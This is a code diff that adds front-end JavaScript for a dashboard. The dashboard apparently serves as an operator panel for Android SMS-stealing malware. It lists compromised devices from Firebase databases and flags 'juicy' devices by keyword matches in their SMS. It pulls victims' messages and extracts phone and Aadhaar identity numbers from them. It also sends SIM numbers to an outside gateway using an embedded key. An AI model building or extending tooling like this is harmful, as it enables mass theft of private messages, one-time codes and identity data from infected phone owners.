+      <button class="filter-btn sort-btn ${currentSort==='newest'?'active':''}" onclick="setSort('newest',this)">🆕 Newest SMS</button>
+    `;
+  }
+
+  if (!filtered.length) {
+    document.getElementById('url-grid').innerHTML = '<div class="loading">No results found</div>';
+    return;
+  }
+
+  document.getElementById('url-grid').innerHTML = filtered.map(u => {
+    const host = u.url.replace('https://','').replace('-default-rtdb.firebaseio.com','').replace('/clients','');
+    const hasJuicy = u.juicyCount > 0;
+    const hasData  = u.total > 0;
+    const onlinePct = u.total > 0 ? Math.round(u.online / u.total * 100) : 0;
+    return `
+    <div class="url-card ${hasJuicy?'has-juicy':''}" onclick="openUrl(${u.id})">
+      <div class="url-card-header">
+        <span class="url-id">#${u.id}</span>
+        <span class="url-host" title="${u.url}">${host}</span>
+      </div>
+      ${!hasData ? `<div class="tag-no-data">No cached devices</div>` : `
+      <div class="url-metrics">
+        <div class="metric">
+          <div class="k">Online / Total</div>
+          <div class="v">
+            <span class="tag-online">${u.online}</span>
+            <span style="color:var(--muted)"> / ${u.total}</span>
+            <span style="font-size:10px;color:var(--muted);margin-left:4px">(${onlinePct}%)</span>
+          </div>
+        </div>
+        <div class="metric">
+          <div class="k">Juicy Devices</div>
+          <div class="v" style="color:${hasJuicy?'var(--yellow)':'var(--muted)'}">
+            ${hasJuicy ? `🎯 ${u.juicyCount}` : '—'}
+          </div>
+        </div>
+        <div class="metric">
+          <div class="k">Oldest SMS</div>
+          <div class="v" style="font-size:12px">${u.oldestSms || '—'}</div>
+        </div>
+        <div class="metric">
+          <div class="k">Newest SMS</div>
+          <div class="v" style="font-size:12px">${u.newestSms || '—'}</div>
+        </div>
+      </div>
+      `}
+    </div>`;
+  }).join('');
+}
+
+document.getElementById('search-input').addEventListener('input', async () => {
+  const q = document.getElementById('search-input').value.trim();
+  // Device ID search: hex chars ≥8, or any non-empty query with ≥6 chars (broader match)
+  // Works from home page, URL list, or alert devices view
+  if (q.length >= 6 && /^[0-9a-f]{6,}$/i.test(q)) {
+    await searchDeviceGlobal(q);
+  } else {
+    document.getElementById('device-search-results').style.display = 'none';
+    // Only restore url-grid if we're in view-urls
+    if (document.getElementById('view-urls').classList.contains('active')) {
+      document.getElementById('url-grid').style.display = '';
+      document.getElementById('sort-bar').style.display = '';
+      renderUrls(allUrls);
+    }
+  }
+});
+
+// ── Open URL devices ──────────────────────────────────────────────────────────
+async function openUrl(id) {
+  document.getElementById('view-home').classList.remove('active');
+  document.getElementById('view-urls').classList.remove('active');
+  document.getElementById('view-devices').classList.add('active');
+  clearSmsSearch();
+  document.getElementById('device-table-wrap').style.display = '';
+  document.getElementById('device-tbody').innerHTML = `<tr><td colspan="13"><div class="loading"><div class="spinner"></div><br>Loading devices…</div></td></tr>`;
+  currentUrlId = id;
+
+  const res = await fetch(`${apiPrefix()}/url/${id}`);
+  const data = await res.json();
+  currentDevices = data.devices || [];
+  loadSimOverridesFromStorage(); // merge any locally saved SIM overrides
+
+  // Load device names for this URL
+  try {
+    const nr = await fetch(`/api/names/${id}?mode=${currentMode}`);
+    currentDeviceNames = await nr.json();
+  } catch { currentDeviceNames = {}; }
+
+  const online  = currentDevices.filter(d => d.status === 'online').length;
+  const offline = currentDevices.length - online;
+  const juicy   = currentDevices.filter(d => d.juicyKeywords.length > 0).length;
+  const sim1    = currentDevices.filter(d => d.sim1Clean).length;
+  const host    = data.url.replace('https://','').replace('-default-rtdb.firebaseio.com','');
+
+  document.getElementById('url-detail-header').innerHTML = `
+    <div>
+      <h2>URL #${data.id} — ${host}</h2>
+      <div style="color:var(--muted);font-size:12px;margin-top:3px">${data.url}</div>
+    </div>
+    <div class="detail-badges">
+      <span class="badge-sm badge-blue">${currentDevices.length} devices</span>
+      <span class="badge-sm badge-green">${online} online</span>
+      <span class="badge-sm badge-red">${offline} offline</span>
+      ${juicy ? `<span class="badge-sm badge-yellow">🎯 ${juicy} juicy</span>` : ''}
+      <span class="badge-sm" style="background:var(--bg3);color:var(--muted)">Schema ${data.schema}</span>
+    </div>
+  `;
+
+  document.getElementById('device-filters').innerHTML = `
+    <button class="filter-btn active" onclick="setFilter('all',this)">All (${currentDevices.length})</button>
+    <button class="filter-btn" onclick="setFilter('online',this)">🟢 Online (${online})</button>
+    <button class="filter-btn" onclick="setFilter('offline',this)">🔴 Offline (${offline})</button>
+    ${juicy ? `<button class="filter-btn" onclick="setFilter('juicy',this)">🎯 Juicy (${juicy})</button>` : ''}
+    ${sim1 ? `<button class="filter-btn" onclick="setFilter('sim1',this)">📱 Has SIM1 (${sim1})</button>` : ''}
+    <button class="filter-btn" onclick="setFilter('today',this)">🔥 Active Today (${currentDevices.filter(d=>_isActiveToday(d.lastActivity)).length})</button>
+    <div class="kw-filter-wrap" id="kw-filter-wrap">
+      <button class="filter-btn" id="kw-filter-btn" onclick="openKeywordPicker(this)">🔑 By Keyword</button>
+      <div class="kw-picker-dropdown" id="kw-picker-dropdown">
+        <div class="kw-picker-header">
+          <span>Select keywords (any match)</span>
+          <span id="kw-selected-count" style="color:var(--accent)"></span>
+        </div>
+        <div class="kw-chip-grid" id="kw-chip-grid"></div>
+        <div class="kw-picker-actions">
+          <button class="btn" style="font-size:11px;padding:3px 10px" onclick="applyKeywordFilter()">Apply</button>
+          <button class="btn btn-ghost" style="font-size:11px;padding:3px 10px" onclick="clearKeywordFilter()">Clear</button>
+        </div>
+      </div>
+    </div>
+  `;
+
+  renderDevices();
+}
+
+function setFilter(f, btn) {
+  activeFilter = f;
+  // Clear keyword filter when switching to a regular filter
+  if (f !== 'kw') {
+    activeKeywordFilter.clear();
+    const kwBtn = document.getElementById('kw-filter-btn');
+    if (kwBtn) { kwBtn.classList.remove('kw-active'); kwBtn.textContent = '🔑 By Keyword'; }
+    const dd = document.getElementById('kw-picker-dropdown');
+    if (dd) dd.classList.remove('open');
+  }
+  document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  renderDevices();
+}
+
+// Returns true if lastActivity string is within the last 24 hours
+function _isActiveToday(lastActivity) {
+  if (!lastActivity || lastActivity === 'Unknown') return false;
+  try {
+    const ts = new Date(lastActivity).getTime();
+    return !isNaN(ts) && (Date.now() - ts) < 86400000;
+  } catch { return false; }
+}
+
+// ── Keyword filter state ──────────────────────────────────────────────────────
+let activeKeywordFilter = new Set(); // selected keyword strings
+
+function openKeywordPicker(btn) {
+  const dd = document.getElementById('kw-picker-dropdown');
+  if (!dd) return;
+  const isOpen = dd.classList.contains('open');
+  if (isOpen) { dd.classList.remove('open'); return; }
+
+  // Build chip grid from all unique keywords across current devices
+  const allKws = new Set();
+  for (const d of currentDevices) (d.juicyKeywords || []).forEach(k => allKws.add(k));
+  const sorted = [...allKws].sort();
+
+  if (!sorted.length) {
+    document.getElementById('kw-chip-grid').innerHTML =
+      '<span style="color:var(--muted);font-size:12px">No keywords found in this URL</span>';
+  } else {
+    document.getElementById('kw-chip-grid').innerHTML = sorted.map(kw => `
+      <span class="kw-chip ${activeKeywordFilter.has(kw) ? 'selected' : ''}"
+            onclick="toggleKeyword(this,'${kw.replace(/'/g,"\\'")}')">
+        ${kw}
+      </span>`).join('');
+  }
+  _updateKwCount();
+  dd.classList.add('open');
+}
+
+function toggleKeyword(chip, kw) {
+  if (activeKeywordFilter.has(kw)) {
+    activeKeywordFilter.delete(kw);
+    chip.classList.remove('selected');
+  } else {
+    activeKeywordFilter.add(kw);
+    chip.classList.add('selected');
+  }
+  _updateKwCount();
+}
+
+function _updateKwCount() {
+  const el = document.getElementById('kw-selected-count');
+  if (el) el.textContent = activeKeywordFilter.size > 0 ? `${activeKeywordFilter.size} selected` : '';
+}
+
+function applyKeywordFilter() {
+  const dd = document.getElementById('kw-picker-dropdown');
+  if (dd) dd.classList.remove('open');
+  if (!activeKeywordFilter.size) { clearKeywordFilter(); return; }
+  // Deactivate other filter buttons, activate kw button
+  document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+  const kwBtn = document.getElementById('kw-filter-btn');
+  if (kwBtn) {
+    kwBtn.classList.add('kw-active');
+    kwBtn.textContent = `🔑 Keywords (${activeKeywordFilter.size})`;
+  }
+  activeFilter = 'kw';
+  renderDevices();
+}
+
+function clearKeywordFilter() {
+  activeKeywordFilter.clear();
+  const dd = document.getElementById('kw-picker-dropdown');
+  if (dd) dd.classList.remove('open');
+  const kwBtn = document.getElementById('kw-filter-btn');
+  if (kwBtn) { kwBtn.classList.remove('kw-active'); kwBtn.textContent = '🔑 By Keyword'; }
+  // Re-activate 'All' button
+  const allBtn = document.querySelector('.filter-btn:first-child');
+  if (allBtn) { allBtn.classList.add('active'); }
+  activeFilter = 'all';
+  renderDevices();
+}
+
+// Close keyword picker when clicking outside
+document.addEventListener('click', e => {
+  const wrap = document.getElementById('kw-filter-wrap');
+  if (wrap && !wrap.contains(e.target)) {
+    const dd = document.getElementById('kw-picker-dropdown');
+    if (dd) dd.classList.remove('open');
+  }
+});
+
+// Copy device ID to clipboard; flash the ✓ indicator
+function copyDeviceId(evt, deviceId, container) {
+  evt.stopPropagation();
+  navigator.clipboard.writeText(deviceId).then(() => {
+    const flash = container.querySelector('.devid-copy-flash');
+    if (flash) {
+      flash.classList.add('show');
+      setTimeout(() => flash.classList.remove('show'), 1500);
+    }
+  }).catch(() => {
+    // Fallback for non-HTTPS: select the text
+    const code = container.querySelector('code');
+    if (code) {
+      const sel = window.getSelection();
+      const range = document.createRange();
+      range.selectNodeContents(code);
+      sel.removeAllRanges();
+      sel.addRange(range);
+    }
+  });
+}
+
+// ── Juicy SMS Modal ───────────────────────────────────────────────────────────
+async function openJuicySms(evt, urlId, deviceId, brand) {
+  evt.stopPropagation();
+  const modal = document.getElementById('juicysms-modal');
+  const title = document.getElementById('juicysms-title');
+  const body  = document.getElementById('juicysms-body');
+
+  title.textContent = `🎯 Juicy SMS — ${brand} (${deviceId.slice(0,16)})`;
+  body.innerHTML = '<div class="loading"><div class="spinner"></div><br>Fetching SMS from Firebase…</div>';
+  modal.classList.add('open');
+
+  try {
+    const res  = await fetch(`/api/url/${urlId}/device/${encodeURIComponent(deviceId)}/juicy-sms?mode=${currentMode}`);
+    const data = await res.json();
+
+    if (data.error && !data.hits?.length) {
+      body.innerHTML = `<p style="color:var(--red)">Error: ${data.error}</p>`;
+      return;
+    }
+    if (!data.hits || !data.hits.length) {
+      body.innerHTML = '<p style="color:var(--muted)">📭 No juicy SMS found for this device.</p>';
+      return;
+    }
+
+    const esc = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    // Highlight all matched keywords in the message body
+    function highlight(text, keywords) {
+      let out = esc(text);
+      for (const kw of keywords) {
+        const re = new RegExp(`(${kw.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')})`, 'gi');
+        out = out.replace(re, '<mark style="background:rgba(245,158,11,.35);color:var(--yellow);border-radius:2px;padding:0 2px">$1</mark>');
+      }
+      return out;
+    }
+
+    body.innerHTML = `
+      <p style="color:var(--muted);font-size:12px;margin-bottom:12px">
+        Found <b style="color:var(--yellow)">${data.total}</b> message(s) containing juicy keywords
+        ${data.total >= 200 ? ' <span style="color:var(--yellow)">(capped at 200)</span>' : ''}
+      </p>
+      ${data.hits.map(h => `
+        <div class="hit-card" style="margin-bottom:8px">
+          <div style="display:flex;flex-wrap:wrap;gap:4px;margin-bottom:6px">
+            ${h.matchedKeywords.map(k => `<span class="kw-tag">${esc(k)}</span>`).join('')}
+          </div>
+          <div class="hit-body">${highlight(h.body, h.matchedKeywords)}</div>
+        </div>`).join('')}`;
+  } catch (e) {
+    body.innerHTML = `<p style="color:var(--red)">Error: ${e.message}</p>`;
+  }
+}
+
+function closeJuicySms() {
+  document.getElementById('juicysms-modal').classList.remove('open');
+}
+
+function renderDevices() {
+  let list = currentDevices;
+  if (activeFilter === 'online')  list = list.filter(d => d.status === 'online');
+  if (activeFilter === 'offline') list = list.filter(d => d.status === 'offline');
+  if (activeFilter === 'juicy')   list = list.filter(d => d.juicyKeywords.length > 0);
+  if (activeFilter === 'sim1')    list = list.filter(d => d.sim1Clean);
+  if (activeFilter === 'today')   list = list.filter(d => _isActiveToday(d.lastActivity));
+  if (activeFilter === 'kw' && activeKeywordFilter.size > 0)
+    list = list.filter(d => d.juicyKeywords.some(k => activeKeywordFilter.has(k)));
+
+  const tbody = document.getElementById('device-tbody');
+  if (!list.length) {
+    tbody.innerHTML = `<tr><td colspan="13" style="text-align:center;padding:40px;color:var(--muted)">No devices match this filter</td></tr>`;
+    return;
+  }
+
+  // Decide whether to show brand column (hide if ALL devices have no real brand)
+  const allUnknownBrand = currentDevices.every(d => !d.brand || d.brand === 'Unknown');
+
+  // Update thead visibility
+  const brandTh = document.querySelector('#device-table thead th:nth-child(4)');
+  if (brandTh) brandTh.style.display = allUnknownBrand ? 'none' : '';
+
+  tbody.innerHTML = list.map((d, i) => {
+    const isOn = d.status === 'online';
+    const activeToday = _isActiveToday(d.lastActivity);
+
+    // SIM rendering: if has clean number → paanel link, else → editable field
+    function simCell(simRaw, simClean, simOverride, slot, deviceId) {
+      const override = simOverride || '';
+      const effective = override || simClean;
+      if (effective) {
+        // Display: show override value as-is (may be a name or number), or simRaw
+        const display = override || simRaw;
+        return `<div class="sim-edit-wrap">
+          ${simClean
+            ? `<a class="sim-link" href="https://api.paanel.shop/api/gateway.php?key=Jack&number=${simClean}" target="_blank">${display}</a>`
+            : `<span>${display}</span>`
+          }
+          <button class="sim-edit-btn" title="Edit" onclick="startSimEdit(event,'${deviceId}','${slot}',this)">✏️</button>
+        </div>`;
+      }
+      // No number — show editable placeholder
+      return `<div class="sim-edit-wrap" id="sim-wrap-${deviceId}-${slot}">
+        <span style="color:var(--muted);font-size:11px">—</span>
+        <button class="sim-edit-btn" title="Add SIM" onclick="startSimEdit(event,'${deviceId}','${slot}',this)">✏️</button>
+      </div>`;
+    }
+
+    const sim1Html = simCell(d.sim1, d.sim1Clean, d.sim1Override, 'sim1', d.deviceId);
+    const sim2Html = simCell(d.sim2, d.sim2Clean, d.sim2Override, 'sim2', d.deviceId);
+
+    const kwHtml = d.juicyKeywords.length
+      ? `<div style="display:flex;align-items:flex-start;gap:4px;flex-wrap:wrap">
+           <div>${d.juicyKeywords.map(k => `<span class="kw-tag">${k}</span>`).join('')}</div>
+           <button class="sms-btn" style="margin-left:2px;white-space:nowrap;flex-shrink:0"
+                   title="View juicy SMS only"
+                   onclick="openJuicySms(event,${currentUrlId},'${d.deviceId}','${d.brand.replace(/'/g,"\\'")}')">💬</button>
+         </div>`
+      : '—';
+
+    // Brand cell: hidden if all unknown
+    const brandCell = allUnknownBrand
+      ? ''
+      : `<td style="font-size:12px">${(!d.brand || d.brand === 'Unknown') ? '<span style="color:var(--border)">—</span>' : d.brand}</td>`;
+
+    // Device ID cell: click to copy + fire badge if active today
+    const fireBadge = activeToday
+      ? `<span class="fire-badge" title="SMS in last 24h">🔥</span>`
+      : '';
+    const deviceIdCell = `<td>
+      <div class="devid-cell" onclick="copyDeviceId(event,'${d.deviceId}',this)" title="Click to copy">
+        ${fireBadge}<code>${d.deviceId.slice(0,16)}</code>
+        <span class="devid-copy-flash" id="cf-${d.deviceId.slice(0,8)}">✓</span>
+      </div>
+    </td>`;
+
+    return `<tr>
+      <td style="color:var(--muted)">${i+1}</td>
+      <td class="name-cell">${nameCell(d.deviceId)}</td>
+      <td><span class="status-dot ${isOn?'dot-online':'dot-offline'}"></span>${isOn?'Online':'Offline'}</td>
+      ${brandCell}
+      ${deviceIdCell}
+      <td>${d.battery}</td>
+      <td>${sim1Html}</td>
+      <td>${sim2Html}</td>
+      <td style="color:var(--muted);font-size:12px">${d.lastActivity || '—'}</td>
+      <td style="color:var(--muted);font-size:12px">${d.lastOnline ? d.lastOnline.slice(0,16) : '—'}</td>
+      <td>${kwHtml}</td>
+      <td><button class="sms-btn" onclick="openNotes(event,${currentUrlId},'${d.deviceId}')">📝</button></td>
+      <td><a class="sms-btn" href="${d.smsLink}" target="_blank">📥 SMS</a>
+          <button class="sms-btn" style="margin-left:4px" onclick="openSearchno(event,${currentUrlId},'${d.deviceId}','${d.brand.replace(/'/g,"\\'")}')">📞</button>
+          ${(d.hasAadhaar || (d.aadhaarNums && d.aadhaarNums.length > 0)) ? `<button class="sms-btn" style="margin-left:4px" onclick="openSearchaadhar(event,${currentUrlId},'${d.deviceId}','${d.brand.replace(/'/g,"\\'")}')">🪪</button>` : ''}
+      </td>
+    </tr>`;
+  }).join('');
+}
+
+function showUrls() {
+  clearSmsSearch();
+  document.getElementById('view-devices').classList.remove('active');
+  document.getElementById('view-home').classList.remove('active');
+  document.getElementById('view-urls').classList.add('active');
+}
+
+// ── Live refresh: poll Firebase then reload device page ───────────────────────
+async function refreshCurrentUrl() {
+  const btn = document.querySelector('#view-devices .btn-ghost');
+  const origText = btn ? btn.textContent : '';
+  if (btn) { btn.textContent = '⏳'; btn.disabled = true; }
+  try {
+    // Trigger server-side Firebase poll (updates DB with fresh status)
+    await fetch(`/api/url/${currentUrlId}/live`);
+  } catch {}
+  if (btn) { btn.textContent = origText; btn.disabled = false; }
+  // Reload device list from freshly updated DB
+  await openUrl(currentUrlId);
+}
+
+// ── Refresh URL list: poll all URLs live then reload ──────────────────────────
+async function refreshUrlList() {
+  const btn = document.getElementById('refresh-btn');
+  if (btn) { btn.textContent = '⏳'; btn.disabled = true; }
+  // Poll all visible URLs in parallel (server fetches Firebase for each)
+  const ids = allUrls.map(u => u.id);
+  await Promise.allSettled(ids.map(id => fetch(`/api/url/${id}/live`).catch(() => {})));
+  if (btn) { btn.textContent = '↻ Refresh'; btn.disabled = false; }
+  await loadUrls();
+}
+
+// ── SearchNo Modal ────────────────────────────────────────────────────────────
+function closeSearchno() {
+  document.getElementById('searchno-modal').classList.remove('open');
+}
+
+async function openSearchno(evt, urlId, deviceId, brand) {
+  evt.stopPropagation();
+  const modal   = document.getElementById('searchno-modal');
+  const title   = document.getElementById('searchno-title');
+  const body    = document.getElementById('searchno-body');
+
+  title.textContent = `📞 Phone Numbers in SMS — ${brand} (${deviceId.slice(0,16)})`;
+  body.innerHTML    = '<div class="loading"><div class="spinner"></div><br>Fetching SMS from Firebase…</div>';
+  modal.classList.add('open');
+
+  try {
+    const res  = await fetch(`/api/url/${urlId}/device/${encodeURIComponent(deviceId)}/searchno?mode=${currentMode}`);
+    const data = await res.json();
+
+    if (data.error && !data.hits?.length) {
+      body.innerHTML = `<p style="color:var(--red)">Error: ${data.error}</p>`;
+      return;
+    }
+    if (!data.hits || data.hits.length === 0) {
+      body.innerHTML = '<p style="color:var(--muted)">📭 No Indian phone numbers found in SMS for this device.</p>';
+      return;
+    }
+
+    const esc = s => s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    body.innerHTML = `
+      <p style="color:var(--muted);margin-bottom:12px;font-size:13px">
+        Found <b style="color:var(--text)">${data.hits.length}</b> SMS message(s) containing phone numbers
+        ${data.hits.length >= 100 ? ' <span style="color:var(--yellow)">(showing first 100)</span>' : ''}
+      </p>
+      ${data.hits.map(h => `
+        <div class="hit-card">
+          <div class="hit-phones">
+            ${h.phones.map(p => `<span class="phone-chip">${p}</span>`).join('')}
+          </div>
+          <div class="hit-body">${esc(h.body.slice(0, 300))}${h.body.length > 300 ? '…' : ''}</div>
+        </div>
+      `).join('')}
+    `;
+  } catch (e) {
+    body.innerHTML = `<p style="color:var(--red)">Failed to fetch: ${e.message}</p>`;
+  }
+}
+
+// ── SearchAadhar Modal ────────────────────────────────────────────────────────
+function closeSearchaadhar() {
+  document.getElementById('searchaadhar-modal').classList.remove('open');
+}
+
+async function openSearchaadhar(evt, urlId, deviceId, brand) {
+  evt.stopPropagation();
+  const modal = document.getElementById('searchaadhar-modal');
+  const title = document.getElementById('searchaadhar-title');
+  const body  = document.getElementById('searchaadhar-body');
+
+  title.textContent = `🪪 Aadhaar Numbers in SMS — ${brand} (${deviceId.slice(0,16)})`;
+  body.innerHTML    = '<div class="loading"><div class="spinner"></div><br>Fetching SMS from Firebase…</div>';
+  modal.classList.add('open');
+
+  try {
+    const res  = await fetch(`/api/url/${urlId}/device/${encodeURIComponent(deviceId)}/searchaadhar?mode=${currentMode}`);
+    const data = await res.json();
+
+    if (data.error && !data.hits?.length) {
+      body.innerHTML = `<p style="color:var(--red)">Error: ${data.error}</p>`;
+      return;
+    }
+    if (!data.hits || data.hits.length === 0) {
+      body.innerHTML = '<p style="color:var(--muted)">📭 No Aadhaar numbers found in SMS for this device.</p>';
+      return;
+    }
+
+    const esc = s => s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    body.innerHTML = `
+      <p style="color:var(--muted);margin-bottom:12px;font-size:13px">
+        Found <b style="color:var(--text)">${data.hits.length}</b> SMS message(s) containing Aadhaar numbers
+        ${data.hits.length >= 100 ? ' <span style="color:var(--yellow)">(showing first 100)</span>' : ''}
+      </p>
+      ${data.hits.map(h => `
+        <div class="hit-card">
+          <div class="hit-phones">
+            ${h.aadhars.map(a => `<span class="phone-chip" style="background:rgba(34,197,94,.12);color:var(--green)">${a}</span>`).join('')}
+          </div>
+          <div class="hit-body">${esc(h.body.slice(0, 300))}${h.body.length > 300 ? '…' : ''}</div>
+        </div>
+      `).join('')}
+    `;
+  } catch (e) {
+    body.innerHTML = `<p style="color:var(--red)">Failed to fetch: ${e.message}</p>`;
+  }
+}
+
+// ── Notes Modal ──────────────────────────────────────────────────────────────
+let _notesUrlId = 0, _notesDeviceId = '';
+
+function closeNotes() {
+  document.getElementById('notes-modal').classList.remove('open');
+}
+
+async function openNotes(evt, urlId, deviceId) {
+  evt.stopPropagation();
+  _notesUrlId = urlId; _notesDeviceId = deviceId;
+  document.getElementById('notes-title').textContent = `📝 Notes — ${deviceId.slice(0,20)}`;
+  document.getElementById('notes-status').textContent = '';
+  document.getElementById('notes-textarea').value = 'Loading…';
+  document.getElementById('notes-modal').classList.add('open');
+  try {
+    const r = await fetch(`/api/notes/${urlId}/${encodeURIComponent(deviceId)}?mode=${currentMode}`);
+    const d = await r.json();
+    document.getElementById('notes-textarea').value = d.note || '';
+  } catch { document.getElementById('notes-textarea').value = ''; }
+}
+
+async function saveNotes() {
+  const note = document.getElementById('notes-textarea').value;
+  try {
+    await fetch(`/api/notes/${_notesUrlId}/${encodeURIComponent(_notesDeviceId)}?mode=${currentMode}`,
+      { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({note}) });
+    document.getElementById('notes-status').textContent = '✅ Saved!';
+    setTimeout(() => document.getElementById('notes-status').textContent = '', 2000);
+  } catch { document.getElementById('notes-status').textContent = '❌ Error'; }
+}
+
+// ── Global Device Search ──────────────────────────────────────────────────────
+async function searchDeviceGlobal(q) {
+  // Hide URL grid, show results panel — works from any view
+  document.getElementById('view-home').classList.remove('active');
+  document.getElementById('view-alert-devices').style.display = 'none';
+  document.getElementById('view-devices').classList.remove('active');
+  document.getElementById('view-urls').classList.add('active');
+  document.getElementById('mode-toggle').style.display = '';
+  document.getElementById('url-grid').style.display = 'none';
+  document.getElementById('sort-bar').style.display = 'none';
+  const panel = document.getElementById('device-search-results');
+  const info  = document.getElementById('device-search-info');
+  const grid  = document.getElementById('device-search-grid');
+  panel.style.display = 'block';
+  info.textContent = `🔍 Searching for device "${q}" across New + Old + PP + SRK URLs…`;
+  grid.innerHTML = '<div class="loading"><div class="spinner"></div></div>';
+
+  try {
+    const res  = await fetch(`/api/search/device/${encodeURIComponent(q)}`);
+    const data = await res.json();
+    if (!data.results.length) {
+      info.textContent = `🔍 No devices found matching "${q}" in any URL set`;
+      grid.innerHTML = '';
+      return;
+    }
+    info.textContent = `🔍 Found ${data.results.length} device(s) matching "${q}"`;
+    const esc = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    const setLabel = s => s === 'pp' ? '🔵 PP' : s === 'old' ? '📦 Old' : s === 'srk' ? '👑 SRK' : '🆕 New';
+    grid.innerHTML = data.results.map(d => `
+      <div class="url-card" style="cursor:default;margin-bottom:8px">
+        <div class="url-card-header">
+          <span class="url-id" style="font-size:14px">#${d.urlId}</span>
+          <span class="url-host">${d.url.replace('https://','').replace('-default-rtdb.firebaseio.com','')}</span>
+          <span class="badge-sm badge-blue" style="margin-left:4px;font-size:10px">${setLabel(d.urlSet)}</span>
+          <span class="badge-sm ${d.status==='online'?'badge-green':'badge-red'}" style="margin-left:auto">${d.status}</span>
+        </div>
+        <div style="font-size:12px;color:var(--muted);margin:4px 0">
+          <code style="color:var(--text)">${esc(d.deviceId)}</code>
+        </div>
+        <div class="url-metrics">
+          <div class="metric"><div class="k">Brand</div><div class="v" style="font-size:12px">${esc(d.brand)}</div></div>
+          <div class="metric"><div class="k">Battery</div><div class="v" style="font-size:12px">${esc(d.battery)}</div></div>
+          <div class="metric"><div class="k">SIM1</div><div class="v" style="font-size:12px">${esc(d.sim1)}</div></div>
+          <div class="metric"><div class="k">Last Act.</div><div class="v" style="font-size:12px">${d.lastActivity||'—'}</div></div>
+        </div>
+        ${d.juicyKeywords.length ? `<div class="tag-juicy" style="margin-top:6px">🎯 ${d.juicyKeywords.join(', ')}</div>` : ''}
+        <div style="margin-top:8px;display:flex;gap:6px;flex-wrap:wrap">
+          <a class="sms-btn" href="${esc(d.smsLink)}" target="_blank">📥 SMS</a>
+          <button class="sms-btn" onclick="switchMode('${d.urlSet}');openUrl(${d.urlId})">👁️ View URL</button>
+          <button class="sms-btn" onclick="openSearchno(event,${d.urlId},'${d.deviceId}','${d.brand.replace(/'/g,"\\'")}')">📞</button>
+          <button class="sms-btn" onclick="openSearchaadhar(event,${d.urlId},'${d.deviceId}','${d.brand.replace(/'/g,"\\'")}')">🪪</button>
+          <button class="sms-btn" onclick="openNotes(event,${d.urlId},'${d.deviceId}')">📝</button>
+        </div>
+      </div>`).join('');
+  } catch (e) {
+    info.textContent = `❌ Search error: ${e.message}`;
+    grid.innerHTML = '';
+  }
+}
+
+// ── Name inline edit ──────────────────────────────────────────────────────────
+function nameCell(deviceId) {
+  const name = currentDeviceNames[deviceId] || '';
+  const esc = s => s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+  if (name) {
+    return `<span class="name-display" title="Click to edit" onclick="startNameEdit('${deviceId}',this)">${esc(name)}</span>`;
+  }
+  return `<span class="name-display empty" title="Click to add name" onclick="startNameEdit('${deviceId}',this)">—</span>`;
+}
+
+function startNameEdit(deviceId, el) {
+  const current = currentDeviceNames[deviceId] || '';
+  const esc = s => s.replace(/"/g,'&quot;');
+  const wrap = el.parentElement;
+  wrap.innerHTML = `
+    <div class="name-edit-wrap">
+      <input class="name-edit-input" id="name-inp-${deviceId}" type="text"
+             value="${esc(current)}" placeholder="Enter name…" maxlength="40"
+             onkeydown="if(event.key==='Enter')saveNameEdit(event,'${deviceId}');if(event.key==='Escape')renderDevices()">
+      <button class="sim-save-btn" onclick="saveNameEdit(event,'${deviceId}')">✓</button>
+      <button class="sim-edit-btn" onclick="renderDevices()" title="Cancel">✕</button>
+    </div>`;
+  document.getElementById(`name-inp-${deviceId}`)?.focus();
+}
+
+async function saveNameEdit(evt, deviceId) {
+  evt.stopPropagation();
+  const inp = document.getElementById(`name-inp-${deviceId}`);
+  if (!inp) return;
+  const val = inp.value.trim();
+  try {
+    await fetch(`/api/names/${currentUrlId}/${encodeURIComponent(deviceId)}?mode=${currentMode}`,
+      { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ name: val }) });
+  } catch {}
+  if (val) currentDeviceNames[deviceId] = val;
+  else delete currentDeviceNames[deviceId];
+  renderDevices();
+}
+
+// ── Keywords Modal ────────────────────────────────────────────────────────────
+async function openKeywordsModal() {
+  document.getElementById('kw-status').textContent = '';
+  document.getElementById('kw-textarea').value = 'Loading…';
+  document.getElementById('keywords-modal').classList.add('open');
+  try {
+    const res = await fetch('/api/keywords');
+    const data = await res.json();
+    document.getElementById('kw-textarea').value = data.keywords.join('\n');
+    document.getElementById('kw-count').textContent = `${data.keywords.length} keywords`;
+  } catch (e) {
+    document.getElementById('kw-textarea').value = '';
+    document.getElementById('kw-status').textContent = `❌ Load error: ${e.message}`;
+  }
+}
+
+function closeKeywordsModal() {
+  document.getElementById('keywords-modal').classList.remove('open');
+}
+
+async function saveKeywords() {
+  const raw = document.getElementById('kw-textarea').value;
+  const keywords = raw.split('\n').map(s => s.trim().toLowerCase()).filter(Boolean);
+  document.getElementById('kw-count').textContent = `${keywords.length} keywords`;
+  try {
+    const res = await fetch('/api/keywords', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ keywords })
+    });
+    const data = await res.json();
+    if (data.ok) {
+      document.getElementById('kw-status').textContent = '✅ Saved!';
+      setTimeout(() => document.getElementById('kw-status').textContent = '', 2500);
+    }
+  } catch (e) {
+    document.getElementById('kw-status').textContent = `❌ ${e.message}`;
+  }
+}
+
+// Update textarea count as user types
+document.getElementById('kw-textarea')?.addEventListener('input', () => {
+  const n = document.getElementById('kw-textarea').value.split('\n').filter(s=>s.trim()).length;
+  document.getElementById('kw-count').textContent = `${n} keywords`;
+});
+
+// ── SIM inline edit ───────────────────────────────────────────────────────────
+// localStorage key: simov_<mode>_<urlId>_<deviceId>_<slot>
+function _simKey(deviceId, slot) {
+  return `simov_${currentMode}_${currentUrlId}_${deviceId}_${slot}`;
+}
+
+function loadSimOverridesFromStorage() {
+  // Apply any stored SIM overrides to currentDevices
+  for (const dev of currentDevices) {
+    const s1 = localStorage.getItem(_simKey(dev.deviceId, 'sim1'));
+    const s2 = localStorage.getItem(_simKey(dev.deviceId, 'sim2'));
